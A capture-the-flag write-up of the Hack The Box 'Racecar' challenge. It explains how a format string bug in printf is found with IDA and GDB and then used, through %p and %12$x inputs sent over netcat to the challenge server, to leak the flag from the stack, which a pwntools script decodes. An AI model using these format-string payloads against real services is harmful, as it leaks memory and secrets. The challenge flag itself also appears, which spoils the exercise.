---
title: "HTB - Racecar [ PWN ]"
date: 2022-02-27T18:39:55-05:00
draft: false
---

Before starting the vulnerability search, we must first perform a basic analysis.

![image](https://user-images.githubusercontent.com/88755387/142025252-e61b2429-06f9-4464-94d7-e3cc8e7507e4.png)

If we look at the strings of the executable and filter by the word 'flag' we realize that there is a file called flag.txt which we assume is hidden.

![image](https://user-images.githubusercontent.com/88755387/142025391-0d68b387-fb14-46ab-948d-345e326b67a9.png)

We are going to debug the executable with the IDA tool.

![image](https://user-images.githubusercontent.com/88755387/142025485-6ad74b6f-29cc-400c-83aa-9f21c3f19d26.png)

Inside the `car_menu` function we have a file called `flag.txt` which will only be opened if the program flow enters `car_menu:loc_FC`. We know this because at that function a call is made to the `_printf` function after 'winning the race'.

Let's see what address the `_printf` function has:

![image](https://user-images.githubusercontent.com/88755387/142025864-4fa8907e-6335-42cc-a400-9be503ae2e00.png)

Before we continue we are going to create a file called 'flag.txt' as the one the program is looking for to read in the same directory where we are going to run the binary.

``` 
echo 'AAAA' > flag.txt
```

We run the binary in GDB and put a breakpoint in the vulnerable function `_printf`:

![image](https://user-images.githubusercontent.com/88755387/142026049-dfe69c2f-3ba4-48e9-8677-7f32f91c4da7.png)

Now we run the binary and enter 40x `%p` to display more information: 

```
gdb-peda$ run
Name: sth
Nickname: sth
> 2
> 1
> 2
> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

![image](https://user-images.githubusercontent.com/88755387/142026262-33deb92a-7566-47e2-a058-e2fd67259d86.png)

At the 12th position, there is a beginning of `flag.txt` — `AAAA` string which was input before. It seems like the flag is stored on the stack.

Now we have to leak the flag from the remote service. We use [direct parameter access input format string](https://kevinalmansa.github.io/application%20security/Format-Strings/) `%12$x` to leak `flag.txt` from a remote system.

```
nc 104.248.169.123 31242
[ ... ]
> %12$x
```

![image](https://user-images.githubusercontent.com/88755387/142026727-f38db53b-bb06-40c0-8c19-4a4bdb7685b0.png)

If we convert them to ASCII we will find the beginning of the flag:

```
7b425448 -> {BTH
4854427b -> HTB{
```

The next step is reversing the flag. As we know that the flag is between two '{}' we will look for the value of the closing brace in hexadecimal.

```
{ -> 7b
} -> 7d
```

Now that we know its value we will reverse the bytes that are inside the braces.

```
%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---
```

![image](https://user-images.githubusercontent.com/88755387/142026897-d3eb1187-6f89-4b88-9aeb-ad6c30199a56.png)

The last thing left is to create a script to view the flag in ASCII:

```python
from pwn import *

flag = '0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f'
decoded_flag = []

for element in flag.split('0x')[1:]:
 decoded_flag.append(p32(int('0x' + element,16)))
 
print (b''.join(decoded_flag))
```

![image](https://user-images.githubusercontent.com/88755387/142027222-c9604f62-37df-4a97-996a-0b5eeb5d6241.png)